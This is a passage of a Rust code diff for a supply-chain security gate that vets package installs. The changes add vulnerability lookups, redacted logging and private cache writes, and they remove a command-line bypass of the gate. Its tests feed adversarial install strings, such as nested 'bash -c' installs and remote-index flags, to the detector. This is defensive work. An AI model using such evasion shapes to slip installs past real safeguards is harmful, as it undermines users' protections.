+                    urlencoding(ver)
+                );
+                let v = http_get_json(&url)?;
+                let urls = v
+                    .get("urls")
+                    .and_then(|x| x.as_array())
+                    .ok_or_else(|| "no urls in pypi response".to_string())?;
+                let first = urls.first().ok_or_else(|| "empty urls list".to_string())?;
+                let ts = first
+                    .get("upload_time_iso_8601")
+                    .or_else(|| first.get("upload_time"))
+                    .and_then(|x| x.as_str())
+                    .ok_or_else(|| "no upload_time".to_string())?;
+                return Ok((ver.to_string(), parse_iso8601(ts)?));
+            }
+
+            let url = format!("https://pypi.org/pypi/{}/json", urlencoding(pkg));
+            let v = http_get_json(&url)?;
+            let latest = v
+                .pointer("/info/version")
+                .and_then(|x| x.as_str())
+                .ok_or_else(|| "no info/version".to_string())?
+                .to_string();
+            let arr = v
+                .pointer(&format!("/releases/{}", latest))
+                .and_then(|x| x.as_array())
+                .ok_or_else(|| "no releases".to_string())?;
+            let first = arr.first().ok_or_else(|| "empty releases".to_string())?;
+            let ts = first
+                .get("upload_time_iso_8601")
+                .or_else(|| first.get("upload_time"))
+                .and_then(|x| x.as_str())
+                .ok_or_else(|| "no upload_time".to_string())?;
+            Ok((latest, parse_iso8601(ts)?))
+        })?;
+    if refresh_cache {
+        cache_put(Ecosystem::Pypi, &cache_key, &resolved, &publish);
     }
-    // When pinned, use the version-specific endpoint (smaller response).
-    // Otherwise hit the package endpoint to discover `info.version` and the
-    // release files.
-    if let Some(ver) = pinned {
-        let url = format!(
-            "https://pypi.org/pypi/{}/{}/json",
-            urlencoding(pkg),
-            urlencoding(ver)
-        );
-        let v = http_get_json(&url)?;
-        let urls = v
-            .get("urls")
-            .and_then(|x| x.as_array())
-            .ok_or_else(|| "no urls in pypi response".to_string())?;
-        let first = urls
-            .first()
-            .ok_or_else(|| "empty urls list".to_string())?;
-        let ts = first
-            .get("upload_time_iso_8601")
-            .or_else(|| first.get("upload_time"))
-            .and_then(|x| x.as_str())
-            .ok_or_else(|| "no upload_time".to_string())?;
-        let publish = parse_iso8601(ts)?;
-        cache_put(Ecosystem::Pypi, &cache_key, ver, &publish);
-        return Ok((ver.to_string(), publish));
-    }
-    let url = format!("https://pypi.org/pypi/{}/json", urlencoding(pkg));
-    let v = http_get_json(&url)?;
-    let latest = v
-        .pointer("/info/version")
-        .and_then(|x| x.as_str())
-        .ok_or_else(|| "no info/version".to_string())?
-        .to_string();
-    let arr = v
-        .pointer(&format!("/releases/{}", latest))
-        .and_then(|x| x.as_array())
-        .ok_or_else(|| "no releases".to_string())?;
-    let first = arr.first().ok_or_else(|| "empty releases".to_string())?;
-    let ts = first
-        .get("upload_time_iso_8601")
-        .or_else(|| first.get("upload_time"))
-        .and_then(|x| x.as_str())
-        .ok_or_else(|| "no upload_time".to_string())?;
-    let publish = parse_iso8601(ts)?;
-    cache_put(Ecosystem::Pypi, &cache_key, &latest, &publish);
-    Ok((latest, publish))
+    Ok((resolved, publish))
 }
 
 /// Parse an ISO-8601 / RFC-3339 timestamp into a UTC `DateTime`.
@@ -2014,6 +2933,17 @@ fn parse_iso8601(s: &str) -> Result<DateTime<Utc>, String> {
             "timestamp {} is more than {}d in the future — refusing to trust it",
             dt,
             skew.num_days()
+        ));
+    }
+
+    // Both supported public registries post-date 2000. Older values cannot
+    // be legitimate package publish times and would otherwise age a forged
+    // cache/registry record past every cooldown.
+    const EARLIEST_PLAUSIBLE_PUBLISH_UNIX: i64 = 946_684_800;
+    if dt.timestamp() < EARLIEST_PLAUSIBLE_PUBLISH_UNIX {
+        return Err(format!(
+            "timestamp {} predates public package registries — refusing to trust it",
+            dt
         ));
     }
 
@@ -2092,6 +3022,36 @@ fn osv_severity(vuln: &Value) -> Severity {
     Severity::High
 }
 
+fn collect_osv_findings(
+    result: Result<Vec<(String, String, Severity)>, String>,
+    package: &str,
+    ecosystem: Ecosystem,
+    block_threshold: Severity,
+    findings: &mut Vec<Finding>,
+) -> Result<(), String> {
+    let vulns = result.map_err(|error| {
+        format!(
+            "OSV lookup failed for {}: {}",
+            crate::core::secret_redact::redact(package),
+            crate::core::secret_redact::redact(&error)
+        )
+    })?;
+    for (id, summary, severity) in vulns {
+        if severity >= block_threshold {
+            findings.push(Finding {
+                package: crate::core::secret_redact::redact(package).into_owned(),
+                ecosystem: ecosystem.as_str().to_string(),
+                reason: FindingReason::KnownVulnerability {
+                    id: crate::core::secret_redact::redact(&id).into_owned(),
+                    summary: crate::core::secret_redact::redact(&summary).into_owned(),
+                },
+                severity,
+            });
+        }
+    }
+    Ok(())
+}
+
 // ---------------------------------------------------------------------------
 // Cache (24h, file-based)
 // ---------------------------------------------------------------------------
@@ -2128,7 +3088,11 @@ struct CacheEntry {
 
 fn cache_get(eco: Ecosystem, pkg: &str) -> Option<(String, DateTime<Utc>)> {
     let path = cache_file(eco, pkg)?;
-    let content = fs::read_to_string(&path).ok()?;
+    cache_get_at(&path)
+}
+
+fn cache_get_at(path: &std::path::Path) -> Option<PackageMetadata> {
+    let content = fs::read_to_string(path).ok()?;
     let entry: CacheEntry = serde_json::from_str(&content).ok()?;
     let fetched = parse_iso8601(&entry.fetched_at).ok()?;
     if (Utc::now() - fetched) > ChronoDuration::hours(24) {
@@ -2138,62 +3102,50 @@ fn cache_get(eco: Ecosystem, pkg: &str) -> Option<(String, DateTime<Utc>)> {
     Some((entry.version, publish))
 }
 
+fn write_private_atomic(path: &std::path::Path, content: &[u8]) -> std::io::Result<()> {
+    let parent = path.parent().ok_or_else(|| {
+        std::io::Error::new(
+            std::io::ErrorKind::InvalidInput,
+            format!("{} has no parent directory", path.display()),
+        )
+    })?;
+    fs::create_dir_all(parent)?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        fs::set_permissions(parent, fs::Permissions::from_mode(0o700))?;
+    }
+
+    let mut temporary = tempfile::NamedTempFile::new_in(parent)?;
+    temporary.write_all(content)?;
+    temporary.flush()?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        temporary
+            .as_file()
+            .set_permissions(fs::Permissions::from_mode(0o600))?;
+    }
+    temporary.as_file().sync_all()?;
+    temporary.persist(path).map_err(|error| error.error)?;
+    Ok(())
+}
+
+fn cache_put_at(path: &std::path::Path, entry: &CacheEntry) -> Result<(), String> {
+    let json = serde_json::to_vec(entry).map_err(|error| error.to_string())?;
+    write_private_atomic(path, &json).map_err(|error| error.to_string())
+}
+
 fn cache_put(eco: Ecosystem, pkg: &str, version: &str, publish: &DateTime<Utc>) {
     let Some(path) = cache_file(eco, pkg) else {
         return;
     };
-    if let Some(parent) = path.parent() {
-        let _ = fs::create_dir_all(parent);
-    }
     let entry = CacheEntry {
         version: version.to_string(),
         publish_time: publish.to_rfc3339(),
         fetched_at: Utc::now().to_rfc3339(),
     };
-    if let Ok(json) = serde_json::to_string(&entry) {
-        let _ = fs::write(&path, json);
-    }
-}
-
-/// Does `cmd` open with a leading `NAME=VALUE` assignment (possibly preceded
-/// by sibling assignments and whitespace), and is that assignment for `name`
-/// with a value in `allowed`?
-///
-/// Used so `CONTEXTCRAWLER_SUPPLY_CHAIN=off pip install x` bypasses the
-/// gate the same way the user reads the hint suggests. Only the *leading*
-/// run of assignments counts — once we see a non-assignment token, the
-/// rest of the cmd is ignored. (Mid-cmd `&& FOO=bar baz` does not bypass.)
-///
-/// Conservative on value parsing: unquoted values are anything up to the
-/// next whitespace; quoted values are not supported in v1 (the bypass
-/// values we care about are short bareword tokens like `off`/`0`/`false`).
-fn cmd_has_leading_assignment(cmd: &str, name: &str, allowed: &[&str]) -> bool {
-    let mut rest = cmd.trim_start();
-    while !rest.is_empty() {
-        // Pull off the next whitespace-delimited token.
-        let tok_end = rest
-            .find(char::is_whitespace)
-            .unwrap_or(rest.len());
-        let token = &rest[..tok_end];
-        // POSIX-shape assignment: NAME=VALUE where NAME is identifier-safe.
-        let Some(eq_idx) = token.find('=') else {
-            // First non-assignment token ends the leading run.
-            return false;
-        };
-        let (n, rhs) = (&token[..eq_idx], &token[eq_idx + 1..]);
-        if n.is_empty()
-            || !n.chars().next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
-            || !n.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
-        {
-            return false;
-        }
-        if n == name && allowed.iter().any(|v| *v == rhs) {
-            return true;
-        }
-        // Advance past this assignment + any whitespace before the next token.
-        rest = rest[tok_end..].trim_start();
-    }
-    false
+    let _ = cache_put_at(&path, &entry);
 }
 
 // ---------------------------------------------------------------------------
@@ -2209,16 +3161,14 @@ pub fn check(cmd: &str) -> Verdict {
     if std::env::var("CONTEXTCRAWLER_SUPPLY_CHAIN").as_deref() == Ok("off") {
         return Verdict::Skip;
     }
-    // Also honour an inline leading-prefix bypass, which is what the gate's
-    // own error messages suggest (`Overrides: rerun with
-    // CONTEXTCRAWLER_SUPPLY_CHAIN=off …`). Without this branch the user
-    // sees the hint, runs the suggested form, and is still blocked — the
-    // inline assignment scopes to the subprocess, not to this hook. See #181.
-    if cmd_has_leading_assignment(
-        cmd,
-        "CONTEXTCRAWLER_SUPPLY_CHAIN",
-        &["off", "0", "false", "no"],
-    ) {
+    check_with_config(cmd, config)
+}
+
+/// Testable policy core. Command text is intentionally not an authority for
+/// disabling the hook: a leading assignment applies only to the command the
+/// hook is inspecting, not to the already-running hook process (#227).
+fn check_with_config(cmd: &str, config: &Config) -> Verdict {
+    if !config.supply_chain.enabled {
         return Verdict::Skip;
     }
 
@@ -2344,16 +3294,16 @@ pub fn check(cmd: &str) -> Verdict {
 
             // Age check against (resolved or pinned) version
             let registry_result = match install.ecosystem {
-                Ecosystem::Npm => npm_metadata(&pkg, pinned.as_deref()),
-                Ecosystem::Pypi => pypi_metadata(&pkg, pinned.as_deref()),
+                Ecosystem::Npm => npm_metadata(&pkg, pinned.as_deref(), eco_cfg.cooldown_days),
+                Ecosystem::Pypi => pypi_metadata(&pkg, pinned.as_deref(), eco_cfg.cooldown_days),
                 // Defensive: Unknown installs always have `unvettable:
                 // Some(...)` + empty packages, so this loop body never
                 // runs for them. If a future code path constructs an
                 // Unknown with packages, surface as transient so the
                 // caller fails to Ask/Unavailable instead of misrouting.
-                Ecosystem::Unknown => Err(
-                    "ecosystem-agnostic install — no registry to query".to_string(),
-                ),
+                Ecosystem::Unknown => {
+                    Err("ecosystem-agnostic install — no registry to query".to_string())
+                }
             };
             let (version, publish) = match registry_result {
                 Ok(v) => v,
@@ -2387,18 +3337,17 @@ pub fn check(cmd: &str) -> Verdict {
                 });
             }
 
-            // CVE check against the specific resolved/pinned version
-            if let Ok(vulns) = osv_query(install.ecosystem, &pkg, &version) {
-                for (id, summary, sev) in vulns {
-                    if sev >= block_threshold {
-                        findings.push(Finding {
-                            package: pkg.clone(),
-                            ecosystem: install.ecosystem.as_str().to_string(),
-                            reason: FindingReason::KnownVulnerability { id, summary },
-                            severity: sev,
-                        });
-                    }
-                }
+            // CVE check against the specific resolved/pinned version. OSV is
+            // part of the allow decision; any lookup/parse failure leaves the
+            // package unvetted and therefore must surface as Unavailable.
+            if let Err(error) = collect_osv_findings(
+                osv_query(install.ecosystem, &pkg, &version),
+                &pkg,
+                install.ecosystem,
+                block_threshold,
+                &mut findings,
+            ) {
+                transient_err.get_or_insert(error);
             }
             // SEC-I2: an osv_query can take up to ~8s. Re-check the budget
             // right after it so the deadline cannot be overrun by a full slow
@@ -2473,6 +3422,74 @@ pub(crate) fn should_log(verdict: &Verdict) -> bool {
     !matches!(verdict, Verdict::Skip)
 }
 
+fn sanitise_finding(finding: &Finding) -> Finding {
+    let redact = |value: &str| crate::core::secret_redact::redact(value).into_owned();
+    Finding {
+        package: redact(&finding.package),
+        ecosystem: redact(&finding.ecosystem),
+        reason: match &finding.reason {
+            FindingReason::RecentRelease {
+                age_days,
+                cooldown_days,
+                version,
+            } => FindingReason::RecentRelease {
+                age_days: *age_days,
+                cooldown_days: *cooldown_days,
+                version: redact(version),
+            },
+            FindingReason::KnownVulnerability { id, summary } => {
+                FindingReason::KnownVulnerability {
+                    id: redact(id),
+                    summary: redact(summary),
+                }
+            }
+            FindingReason::UnvettableSource { token_kind } => FindingReason::UnvettableSource {
+                token_kind: redact(token_kind),
+            },
+            FindingReason::UnvettableInstall { detail } => FindingReason::UnvettableInstall {
+                detail: redact(detail),
+            },
+        },
+        severity: finding.severity,
+    }
+}
+
+fn append_private_audit_record(path: &std::path::Path, record: &str) -> std::io::Result<()> {
+    let mut options = fs::OpenOptions::new();
+    options.create(true).append(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        options
+            .mode(0o600)
+            .custom_flags(libc::O_NOFOLLOW | libc::O_CLOEXEC);
+    }
+    let mut file = options.open(path)?;
+    let metadata = file.metadata()?;
+    if !metadata.is_file() {
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::InvalidInput,
+            format!("{} is not a regular file", path.display()),
+        ));
+    }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::MetadataExt;
+        if metadata.nlink() != 1 {
+            return Err(std::io::Error::new(
+                std::io::ErrorKind::InvalidInput,
+                format!("{} has multiple hard links", path.display()),
+            ));
+        }
+    }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        file.set_permissions(fs::Permissions::from_mode(0o600))?;
+    }
+    writeln!(file, "{}", record)
+}
+
 /// Append a gate event to the local log for `contextcrawler security --supply-chain-log`.
 pub fn log_event(cmd: &str, verdict: &Verdict) {
     // Suppress the no-install `Skip` firehose (#190) before any I/O.
@@ -2486,6 +3503,13 @@ pub fn log_event(cmd: &str, verdict: &Verdict) {
     if fs::create_dir_all(&dir).is_err() {
         return;
     }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        if fs::set_permissions(&dir, fs::Permissions::from_mode(0o700)).is_err() {
+            return;
+        }
+    }
     let path = dir.join("supply_chain.jsonl");
     let kind = match verdict {
         Verdict::Skip => "skip",
@@ -2495,7 +3519,10 @@ pub fn log_event(cmd: &str, verdict: &Verdict) {
         Verdict::Unavailable(_) => "unavailable",
     };
     let findings = match verdict {
-        Verdict::Block(f) | Verdict::Ask(f) => serde_json::to_string(f).unwrap_or_default(),
+        Verdict::Block(f) | Verdict::Ask(f) => {
+            let safe = f.iter().map(sanitise_finding).collect::<Vec<_>>();
+            serde_json::to_string(&safe).unwrap_or_default()
+        }
         _ => "[]".to_string(),
     };
     // Scrub credentials before the cmd lands on disk. See issue #180.
@@ -2507,9 +3534,7 @@ pub fn log_event(cmd: &str, verdict: &Verdict) {
         serde_json::to_string(safe_cmd.as_ref()).unwrap_or_else(|_| "\"\"".into()),
         findings
     );
-    if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(&path) {
-        let _ = writeln!(f, "{}", record);
-    }
+    let _ = append_private_audit_record(&path, &record);
 }
 
 /// Render a Verdict as a human-readable explanation (for hook warnings and CLI).
@@ -2522,15 +3547,13 @@ pub fn render(verdict: &Verdict) -> String {
         Verdict::Unavailable(e) => format!(
             "[contextcrawler supply-chain] WARN — gate unavailable ({}). \
              Failing closed: auto-allow downgraded to Ask.",
-            e
+            crate::core::secret_redact::redact(e)
         ),
         Verdict::Block(findings) => {
             let mut s = String::from("[contextcrawler supply-chain] BLOCKED\n");
             s.push_str(&render_findings(findings));
-            s.push_str(
-                "  Overrides: rerun with CONTEXTCRAWLER_SUPPLY_CHAIN=off, or add the package\n",
-            );
-            s.push_str("  to ~/.config/contextcrawler/supply-chain.toml [overrides.always_allow]");
+            s.push_str("  Approve explicitly in the host, or add the package to\n");
+            s.push_str("  ~/.config/contextcrawler/supply-chain.toml [overrides.always_allow].");
             s
         }
         Verdict::Ask(findings) => {
@@ -2539,10 +3562,7 @@ pub fn render(verdict: &Verdict) -> String {
                  Failing closed: auto-allow downgraded to Ask.\n",
             );
             s.push_str(&render_findings(findings));
-            s.push_str(
-                "  Review the lockfile/requirements file, then confirm to proceed, or rerun\n",
-            );
-            s.push_str("  with CONTEXTCRAWLER_SUPPLY_CHAIN=off to skip the gate.");
+            s.push_str("  Review the source, then confirm explicitly in the host to proceed.");
             s
         }
     }
@@ -2551,7 +3571,8 @@ pub fn render(verdict: &Verdict) -> String {
 /// Render a list of findings as indented human-readable lines.
 fn render_findings(findings: &[Finding]) -> String {
     let mut s = String::new();
-    for f in findings {
+    for raw_finding in findings {
+        let f = sanitise_finding(raw_finding);
         match &f.reason {
             FindingReason::RecentRelease {
                 age_days,
@@ -2601,7 +3622,10 @@ mod tests {
     #[test]
     fn should_log_suppresses_skip_keeps_real_verdicts() {
         // #190: `Skip` fires for every non-install command — must NOT be logged.
-        assert!(!should_log(&Verdict::Skip), "Skip is the no-install firehose");
+        assert!(
+            !should_log(&Verdict::Skip),
+            "Skip is the no-install firehose"
+        );
         // Every real gate decision must still be persisted.
         assert!(should_log(&Verdict::Allow));
         assert!(should_log(&Verdict::Block(vec![])));
@@ -3155,11 +4179,11 @@ mod tests {
     #[test]
     fn conda_adversarial_head_variants_unvettable() {
         for cmd in [
-            "conda.exe install numpy",     // Windows launcher
-            "CONDA INSTALL numpy",         // case-insensitive
+            "conda.exe install numpy",            // Windows launcher
+            "CONDA INSTALL numpy",                // case-insensitive
             "/opt/conda/bin/conda install numpy", // abs path
-            "'conda' install numpy",       // quoted head
-            "conda install \\\n  numpy",   // line-continuation
+            "'conda' install numpy",              // quoted head
+            "conda install \\\n  numpy",          // line-continuation
         ] {
             let v = detect_installs(cmd);
             assert_eq!(v.len(), 1, "conda variant must detect: {cmd:?}");
@@ -3234,7 +4258,11 @@ mod tests {
         // BLOCKER: `--with <group>` consumes the next token. Before this fix,
         // `dev` was treated as a package and the install was silently dropped.
         let v = detect_installs("poetry install --with dev");
-        assert_eq!(v.len(), 1, "poetry install --with dev must still surface as bare");
+        assert_eq!(
+            v.len(),
+            1,
+            "poetry install --with dev must still surface as bare"
+        );
         assert_eq!(v[0].ecosystem, Ecosystem::Pypi);
         assert!(v[0].unvettable.is_some());
     }
@@ -3374,7 +4402,10 @@ mod tests {
         // Codex LOW on #143: `yarn --version` is a diagnostic invocation;
         // the bare-yarn rule used to over-match any dash-prefixed next-token.
         let v = detect_installs("yarn --version");
-        assert!(v.is_empty(), "yarn --version must NOT classify as install: {v:?}");
+        assert!(
+            v.is_empty(),
+            "yarn --version must NOT classify as install: {v:?}"
+        );
     }
 
     #[test]
@@ -3434,7 +4465,12 @@ mod tests {
         // `uv pip install foo` must match the UV pattern once, NOT also
         // the bare PIP pattern on the inner `pip install foo` substring.
         let v = detect_installs("uv pip install requests");
-        assert_eq!(v.len(), 1, "expected exactly one detection, got {}", v.len());
+        assert_eq!(
+            v.len(),
+            1,
+            "expected exactly one detection, got {}",
+            v.len()
+        );
     }
 
     #[test]
@@ -3489,17 +4525,18 @@ mod tests {
     }
 
     #[test]
-    fn skip_flag_args() {
+    fn requirements_flag_is_one_unvettable_unit() {
         let v = detect_installs("pip install -r requirements.txt foo");
-        // -r and requirements.txt should both be skipped; only `foo` remains
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
+        assert!(v[0].unvettable.is_some());
     }
 
     #[test]
-    fn url_install_treated_as_editable() {
+    fn url_install_is_remote_unvettable_not_local_editable() {
         let v = detect_installs("pip install https://example.com/pkg.tar.gz");
-        assert!(v[0].has_editable);
+        assert!(!v[0].has_editable);
         assert!(v[0].packages.is_empty());
+        assert!(v[0].unvettable.is_some());
     }
 
     // ─── #145: parse_package_args robustness ───────────────────────────────
@@ -3533,7 +4570,10 @@ mod tests {
             split_name_version("celery[redis]==5.3.0"),
             ("celery".to_string(), Some("5.3.0".to_string()))
         );
-        assert_eq!(split_name_version("requests[socks,security]>=2.0").0, "requests");
+        assert_eq!(
+            split_name_version("requests[socks,security]>=2.0").0,
+            "requests"
+        );
     }
 
     #[test]
@@ -3563,23 +4603,26 @@ mod tests {
     }
 
     #[test]
-    fn pip_value_consuming_flag_trusted_host() {
+    fn pip_trusted_host_is_unvettable_without_leaking_the_host() {
         let v = detect_installs("pip install --trusted-host pypi.org foo");
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
+        assert!(v[0].unvettable.is_some());
+        assert!(!format!("{v:?}").contains("pypi.org"));
     }
 
     #[test]
-    fn pip_value_consuming_flag_extra_index_url() {
+    fn pip_extra_index_url_is_unvettable_without_leaking_the_url() {
         let v = detect_installs("pip install --extra-index-url https://pkg.example.org/simple foo");
-        let ns = names(&v[0]);
-        assert!(ns.contains(&"foo"));
-        assert!(!ns.iter().any(|n| n.starts_with("http")));
+        assert!(v[0].packages.is_empty());
+        assert!(v[0].unvettable.is_some());
+        assert!(!format!("{v:?}").contains("pkg.example.org"));
     }
 
     #[test]
-    fn pip_value_consuming_flag_find_links() {
+    fn pip_find_links_is_one_unvettable_unit() {
         let v = detect_installs("pip install --find-links /tmp/wheels foo");
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
+        assert!(v[0].unvettable.is_some());
     }
 
     #[test]
@@ -3657,10 +4700,7 @@ mod tests {
         };
         let mut items = vec![mk("a"), mk("b"), mk("a"), mk("c"), mk("b"), mk("a")];
         dedup_installs(&mut items);
-        let names: Vec<&str> = items
-            .iter()
-            .map(|i| i.packages[0].0.as_str())
-            .collect();
+        let names: Vec<&str> = items.iter().map(|i| i.packages[0].0.as_str()).collect();
         assert_eq!(names, vec!["a", "b", "c"], "first-occurrence order broken");
     }
 
@@ -3801,14 +4841,12 @@ mod tests {
     }
 
     #[test]
-    fn requirements_install_with_named_pkg_keeps_name_and_stays_unvettable() {
-        // `pip install -r req.txt foo` names `foo` (vettable) AND pulls the
-        // requirements file contents (unvettable). The named package must
-        // still be resolved, but the install must remain flagged unvettable
-        // because the `-r` file is not enumerable — fail closed (#111 G1).
+    fn requirements_install_with_named_pkg_is_one_unvettable_unit() {
+        // The requirements file makes the whole install unvettable. Do not
+        // retain `foo` as a hybrid vettable package alongside that caveat.
         let v = detect_installs("pip install -r requirements.txt foo");
         assert_eq!(v.len(), 1);
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
         assert!(
             v[0].unvettable.is_some(),
             "a -r requirements file alongside a named package must still flag unvettable"
@@ -3850,11 +4888,7 @@ mod tests {
         ] {
             let v = detect_installs(cmd);
             assert_eq!(v.len(), 1, "`{}` should yield one install", cmd);
-            assert!(
-                v[0].packages.is_empty(),
-                "`{}` should name no package",
-                cmd
-            );
+            assert!(v[0].packages.is_empty(), "`{}` should name no package", cmd);
             assert!(
                 v[0].unvettable.is_some(),
                 "`{}` must be flagged unvettable",
@@ -3928,12 +4962,10 @@ mod tests {
     }
 
     #[test]
-    fn pip_install_attached_requirement_with_named_pkg_keeps_name() {
-        // `--requirement=req.txt foo` names `foo` AND pulls the requirements
-        // file — name resolved, install still flagged unvettable.
+    fn pip_install_attached_requirement_with_named_pkg_is_one_unvettable_unit() {
         let v = detect_installs("pip install --requirement=req.txt foo");
         assert_eq!(v.len(), 1);
-        assert_eq!(names(&v[0]), vec!["foo"]);
+        assert!(v[0].packages.is_empty());
         assert!(v[0].unvettable.is_some());
     }
 
@@ -4015,11 +5047,11 @@ mod tests {
     }
 
     #[test]
-    fn parse_iso8601_far_past_still_parses() {
-        // A genuine far-past date is valid (it just means the package is old
-        // and clears the cooldown legitimately) — only future dates are
-        // suspect. The fix must not reject the past.
-        assert!(parse_iso8601("2001-09-11T00:00:00Z").is_ok());
+    fn parse_iso8601_rejects_implausibly_old_timestamp_231() {
+        assert!(
+            parse_iso8601("1970-01-01T00:00:00Z").is_err(),
+            "registry publish dates predating public package registries are not trustworthy"
+        );
     }
 
     // --- SEC-I2: package cap --------------------------------------------
@@ -4068,16 +5100,13 @@ mod tests {
 
     #[test]
     fn osv_severity_extracts_from_database_specific() {
-        let v: Value = serde_json::from_str(
-            r#"{"database_specific":{"severity":"MODERATE"}}"#,
-        )
-        .unwrap();
+        let v: Value =
+            serde_json::from_str(r#"{"database_specific":{"severity":"MODERATE"}}"#).unwrap();
         assert_eq!(osv_severity(&v), Severity::Medium);
 
-        let v: Value = serde_json::from_str(
-            r#"{"severity":[{"score":"CVSS:3.1/.../A:H CRITICAL"}]}"#,
-        )
-        .unwrap();
+        let v: Value =
+            serde_json::from_str(r#"{"severity":[{"score":"CVSS:3.1/.../A:H CRITICAL"}]}"#)
+                .unwrap();
         assert_eq!(osv_severity(&v), Severity::Critical);
 
         // No severity info → default High (so it doesn't slip past a HIGH threshold).
@@ -4157,7 +5186,11 @@ mod tests {
         assert_eq!(names(&v[0]), vec!["lodash"]);
 
         let v = detect_installs(r#""pip" install requests"#);
-        assert_eq!(v.len(), 1, "double-quoted-head pip install must be detected");
+        assert_eq!(
+            v.len(),
+            1,
+            "double-quoted-head pip install must be detected"
+        );
         assert_eq!(names(&v[0]), vec!["requests"]);
     }
 
@@ -4167,10 +5200,12 @@ mod tests {
         // `--description="install & test"`. The quote-aware tokeniser must
         // mask operators inside quoted regions so the package name `lodash`
         // following the flag is still captured.
-        let v = detect_installs(
-            r#"npm install --description="install & test" lodash"#,
+        let v = detect_installs(r#"npm install --description="install & test" lodash"#);
+        assert_eq!(
+            v.len(),
+            1,
+            "operator inside quotes must not truncate the scan"
         );
-        assert_eq!(v.len(), 1, "operator inside quotes must not truncate the scan");
         assert!(
             names(&v[0]).contains(&"lodash"),
             "lodash should still be captured past the quoted operator, got: {:?}",
@@ -4202,8 +5237,7 @@ mod tests {
              and must be surfaced (conservative — fail closed)"
         );
         assert!(
-            v.iter()
-                .any(|i| i.packages.iter().any(|(n, _)| n == "foo")),
+            v.iter().any(|i| i.packages.iter().any(|(n, _)| n == "foo")),
             "inner install package must be named, got: {:?}",
             v
         );
@@ -4252,7 +5286,8 @@ mod tests {
         // matched the canonical form. Now any `-[chars]c` cluster fires.
         let v = detect_installs(r#"bash -lc 'npm install evil'"#);
         assert!(
-            v.iter().any(|i| i.packages.iter().any(|(n, _)| n == "evil")),
+            v.iter()
+                .any(|i| i.packages.iter().any(|(n, _)| n == "evil")),
             "bash -lc must recurse: {v:?}"
         );
     }
@@ -4261,7 +5296,8 @@ mod tests {
     fn bash_xc_combined_option_install_detected() {
         let v = detect_installs(r#"bash -xc 'npm install nasty'"#);
         assert!(
-            v.iter().any(|i| i.packages.iter().any(|(n, _)| n == "nasty")),
+            v.iter()
+                .any(|i| i.packages.iter().any(|(n, _)| n == "nasty")),
             "bash -xc must recurse: {v:?}"
         );
     }
@@ -4310,7 +5346,10 @@ mod tests {
             "depth-cap marker must be Ecosystem::Unknown (#147), not Npm"
         );
         assert!(
-            v.iter().any(|i| i.unvettable.as_deref().is_some_and(|s| s.contains("recursion depth limit"))),
+            v.iter().any(|i| i
+                .unvettable
+                .as_deref()
+                .is_some_and(|s| s.contains("recursion depth limit"))),
             "depth-cap Unvettable marker missing: {v:?}"
         );
     }
@@ -4334,9 +5373,7 @@ mod tests {
         // Defence in depth: nesting `sh -c` inside `bash -c` is a known
         // adversarial shape (PR #139 review). The recursion must walk both
         // layers.
-        let v = detect_installs(
-            r#"bash -c 'sh -c "npm install nested"'"#,
-        );
+        let v = detect_installs(r#"bash -c 'sh -c "npm install nested"'"#);
         assert!(
             v.iter()
                 .any(|i| i.packages.iter().any(|(n, _)| n == "nested")),
@@ -4348,7 +5385,10 @@ mod tests {
     #[test]
     fn bash_c_double_dash_install_detected() {
         let v = detect_installs("bash -c -- 'cd /tmp && sh -c \"npm install\"'");
-        assert!(!v.is_empty(), "nested bare install under double dash -- must be detected: {v:?}");
+        assert!(
+            !v.is_empty(),
+            "nested bare install under double dash -- must be detected: {v:?}"
+        );
 
         let v2 = detect_installs("bash -cce 'npm install lodash'");
         assert!(!v2.is_empty(), "bash -cce must be detected: {v2:?}");
@@ -4368,7 +5408,7 @@ mod tests {
     #[test]
     fn shell_tokens_strips_single_quotes() {
         // Direct tokeniser unit test: `'npm'` -> token text `npm`.
-        let toks = shell_tokens(r#"'npm' install"#);
+        let toks = shell_tokens(r#"'npm' install"#).expect("balanced shell words");
         assert_eq!(toks.len(), 2);
         assert_eq!(toks[0].1, "npm");
         assert_eq!(toks[1].1, "install");
@@ -4376,7 +5416,7 @@ mod tests {
 
     #[test]
     fn shell_tokens_strips_double_quotes() {
-        let toks = shell_tokens(r#""pip" install"#);
+        let toks = shell_tokens(r#""pip" install"#).expect("balanced shell words");
         assert_eq!(toks.len(), 2);
         assert_eq!(toks[0].1, "pip");
         assert_eq!(toks[1].1, "install");
@@ -4387,7 +5427,7 @@ mod tests {
         // Regression guard: the operator-splitting behaviour must survive
         // for unquoted regions. `npm install x && echo y` must still split
         // the `&&` as its own token.
-        let toks = shell_tokens("npm install x && echo y");
+        let toks = shell_tokens("npm install x && echo y").expect("balanced shell words");
         let ops: Vec<&str> = toks.iter().map(|(_, s)| s.as_str()).collect();
         assert!(
             ops.contains(&"&&"),
@@ -4399,7 +5439,7 @@ mod tests {
     #[test]
     fn shell_tokens_keeps_operators_inside_quotes_attached() {
         // `'a && b'` is one token whose text is `a && b`.
-        let toks = shell_tokens(r#"foo 'a && b' bar"#);
+        let toks = shell_tokens(r#"foo 'a && b' bar"#).expect("balanced shell words");
         let texts: Vec<&str> = toks.iter().map(|(_, s)| s.as_str()).collect();
         assert!(
             texts.iter().any(|t| t.contains("&&")),
@@ -4515,7 +5555,10 @@ mod tests {
     #[test]
     fn jq_with_install_substring_is_not_an_install() {
         let v = detect_installs(r#"jq '.scripts | select(. == "npm install foo")' package.json"#);
-        assert!(v.is_empty(), "jq filter is data processing, not install: {v:?}");
+        assert!(
+            v.is_empty(),
+            "jq filter is data processing, not install: {v:?}"
+        );
     }
 
